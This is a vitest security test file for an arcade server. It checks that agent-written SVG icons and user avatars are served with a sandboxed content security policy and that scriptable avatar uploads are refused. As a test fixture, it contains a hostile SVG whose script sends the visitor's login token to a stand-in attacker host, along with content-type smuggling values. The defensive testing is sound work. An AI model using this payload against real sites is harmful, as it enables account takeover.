/**
 * The headers that stop agent-authored bytes running as code on the
 * arcade's origin.
 *
 * The vulnerability these exist for was real and was confirmed in a browser:
 * a game's `arcade/icon.svg` is written by an AGENT, captured off its dev
 * server, and served back from `/api/games/:id/art/:kind` as
 * `image/svg+xml`. An SVG served that way is a document, not a picture —
 * navigate to one and it runs its own `<script>`, on the arcade's origin,
 * where the visitor's `ark_` login token sits in localStorage. A hostile
 * icon took over the account of anyone who opened it.
 *
 * `sandbox` in the CSP is what makes that impossible, so it is asserted
 * here rather than left to a code comment.
 */
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import Fastify, { type FastifyInstance } from 'fastify';
import { ArcadeDb, type GameRow } from '../server/db.ts';
import { EventHub } from '../server/events.ts';
import type { GameEngine } from '../server/engine.ts';
import { isAllowedAvatar, registerRoutes } from '../server/routes.ts';
import { appCsp, UNTRUSTED_MEDIA_CSP, registerSecurityHeaders } from '../server/security.ts';
import { seedArcade } from './seed.ts';

let app: FastifyInstance;
let db: ArcadeDb;
let game: GameRow;
let hostileAvatarUserId: string;

const engineStub = {
  ensureWatcher: async () => {},
  dropWatcher: () => {},
  poke: () => {},
} as unknown as GameEngine;

/** What a compromised game agent would write into its `public/` dir. */
const HOSTILE_SVG =
  '<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">' +
  '<script>fetch("https://attacker.test/?t="+localStorage.getItem("reflex-arcade:token"))</script>' +
  '</svg>';

beforeAll(async () => {
  db = await ArcadeDb.open({ kind: 'pglite', dataDir: 'memory://' });
  const seeded = await seedArcade(db);
  await db.setGameArt(seeded.gameId, {
    iconArt: `data:image/svg+xml;base64,${Buffer.from(HOSTILE_SVG).toString('base64')}`,
  });
  game = (await db.gameById(seeded.gameId))!;

  // The same attack from the other direction: a player's own upload, which
  // reaches the identical "bytes we did not write, served from our origin"
  // shape as an agent's icon. Written straight to the row, because the
  // route no longer accepts one — rows like this predate that rule.
  const hostile = await db.createUser('Mallory');
  hostileAvatarUserId = hostile.id;
  await db.updateProfile(hostile.id, {
    avatar: `data:image/svg+xml;base64,${Buffer.from(HOSTILE_SVG).toString('base64')}`,
  });

  app = Fastify();
  // Stands in for the app shell: the CSP is applied to HTML by content
  // type, so anything that answers HTML is covered, not just one route.
  app.get('/fake-shell', async (_req, reply) => reply.type('text/html').send('<!doctype html>'));
  registerRoutes(app, {
    db,
    hub: new EventHub(),
    engine: engineStub,
    reflexAgentType: 'claude-code',
  });
  registerSecurityHeaders(app);
  await app.ready();
});

afterAll(async () => {
  await app.close();
  await db.close();
});

describe('agent-authored art', () => {
  it('is served sandboxed, so a hostile SVG cannot run its script', async () => {
    const reply = await app.inject({
      method: 'GET',
      url: `/api/games/${game.id}/art/icon?v=${game.artVersion}`,
    });
    expect(reply.statusCode).toBe(200);
    expect(reply.headers['content-type']).toBe('image/svg+xml');
    // `sandbox` without `allow-scripts` is the control; the rest keeps the
    // document from reaching out for anything either.
    expect(reply.headers['content-security-policy']).toBe(UNTRUSTED_MEDIA_CSP);
    expect(String(reply.headers['content-security-policy'])).toContain('sandbox');
    expect(String(reply.headers['content-security-policy'])).not.toContain('allow-scripts');
  });

  it('hands the bytes back as authored — the sandbox is the fix, not filtering', async () => {
    // Deliberate: stripping tags out of a hostile SVG is a regex arms race,
    // and mangling art would break the animation the agents legitimately
    // use. The browser is stopped from executing it instead.
    const reply = await app.inject({
      method: 'GET',
      url: `/api/games/${game.id}/art/icon?v=${game.artVersion}`,
    });
    expect(reply.body).toContain('<script>');
  });
});

describe('player-uploaded avatars', () => {
  // Exactly the art vulnerability, wearing a smaller upload: an SVG avatar
  // navigated to directly is a document on the arcade's origin, and the
  // `ark_` login token it could read out of localStorage is the account.
  it('are served sandboxed too, whoever uploaded them', async () => {
    const reply = await app.inject({ url: `/api/users/${hostileAvatarUserId}/avatar` });
    expect(reply.statusCode).toBe(200);
    expect(reply.headers['content-type']).toContain('image/svg+xml');
    expect(reply.headers['content-security-policy']).toBe(UNTRUSTED_MEDIA_CSP);
    expect(String(reply.headers['content-security-policy'])).not.toContain('allow-scripts');
  });

  // The profile form submits every field it holds, including the picture it
  // loaded. Checking an unchanged avatar would lock anyone whose stored one
  // predates the raster rule out of editing their own name — rejected for a
  // value they did not touch and cannot see.
  it('do not lock an existing owner out of their own profile', async () => {
    const token = (await db.userById(hostileAvatarUserId))!.token;
    const before = (await db.userById(hostileAvatarUserId))!;
    const reply = await app.inject({
      method: 'PATCH',
      url: '/api/me',
      headers: { authorization: `Bearer ${token}` },
      payload: { name: 'Mallory Renamed', avatar: before.avatar },
    });
    expect(reply.statusCode).toBe(200);
    expect((await db.userById(hostileAvatarUserId))!.name).toBe('Mallory Renamed');
  });

  it('still refuse a NEW scriptable upload', async () => {
    const token = (await db.userById(hostileAvatarUserId))!.token;
    const reply = await app.inject({
      method: 'PATCH',
      url: '/api/me',
      headers: { authorization: `Bearer ${token}` },
      payload: { avatar: `data:image/svg+xml;base64,${Buffer.from('<svg/>').toString('base64')}` },
    });
    expect(reply.statusCode).toBe(400);
    expect(reply.json()).toMatchObject({ error: 'invalid_avatar' });
  });

  // The other half: nothing scriptable gets into the database in the first
  // place. A picture of a person is a raster, so this costs nobody a thing.
  it('cannot be uploaded as SVG at all', () => {
    expect(isAllowedAvatar('data:image/png;base64,aaaa')).toBe(true);
    expect(isAllowedAvatar('data:image/webp;base64,aaaa')).toBe(true);
    expect(isAllowedAvatar('data:image/svg+xml;base64,aaaa')).toBe(false);
    // Not a data URL, and not base64 — neither is an image the arcade can
    // serve back, and both are ways to smuggle a content type past a
    // `startsWith('data:image/')` check.
    expect(isAllowedAvatar('data:image/png,<svg onload=alert(1)>')).toBe(false);
    expect(isAllowedAvatar('https://attacker.test/x.png')).toBe(false);
  });
});

describe('every response', () => {
  it('refuses content-type sniffing and keeps game URLs out of referrers', async () => {
    // A game id IS the capability to view an unlisted game; a full referrer
    // would hand it to every host a game links out to.
    const reply = await app.inject({ method: 'GET', url: '/api/health' });
    expect(reply.headers['x-content-type-options']).toBe('nosniff');
    expect(reply.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
  });

  it('asks for HTTPS only when it was reached over HTTPS', async () => {
    const plain = await app.inject({ method: 'GET', url: '/api/health' });
    expect(plain.headers['strict-transport-security']).toBeUndefined();

    const secure = await app.inject({
      method: 'GET',
      url: '/api/health',
      headers: { 'x-forwarded-proto': 'https' },
    });
    expect(secure.headers['strict-transport-security']).toContain('max-age=');

    // A proxy chain gives a list; the first hop is the client's.
    const chained = await app.inject({
      method: 'GET',
      url: '/api/health',
      headers: { 'x-forwarded-proto': 'https, http' },
    });
    expect(chained.headers['strict-transport-security']).toContain('max-age=');
  });
});

describe('the app policy', () => {
  it('covers every HTML answer, and never overrides the art sandbox', async () => {
    const shell = await app.inject({ method: 'GET', url: '/fake-shell' });
    const csp = String(shell.headers['content-security-policy']);
    expect(csp).toContain("default-src 'self'");
    // No `unsafe-inline` for script: Vite emits one external module, and
    // the only inline block is JSON-LD, which a browser never executes.
    expect(csp).toContain("script-src 'self'");
    expect(csp).not.toContain("script-src 'self' 'unsafe-inline'");
    // Nothing legitimately frames the arcade — an oEmbed embeds the GAME.
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");

    // Agent-authored bytes keep the far stricter sandbox policy.
    const art = await app.inject({
      method: 'GET',
      url: `/api/games/${game.id}/art/icon?v=${game.artVersion}`,
    });
    expect(art.headers['content-security-policy']).toBe(UNTRUSTED_MEDIA_CSP);
  });

  it('frames any https game, and the mock only when Reflex itself is local', () => {
    // A game's iframe is its agent's dev server on a devbox nobody can
    // enumerate ahead of time, so the scheme is the only thing to pin.
    expect(appCsp('https://reflex.runloop.ai')).toContain('frame-src https:;');

    // Offline runs put the fake games on plain http; that origin is added
    // by name — never a bare `http:`, which would let any plaintext page
    // in the world into a game frame.
    const offline = appCsp('http://localhost:8791');
    expect(offline).toContain('frame-src https: http://localhost:8791;');
    expect(offline).not.toContain('frame-src https: http:;');
  });
});
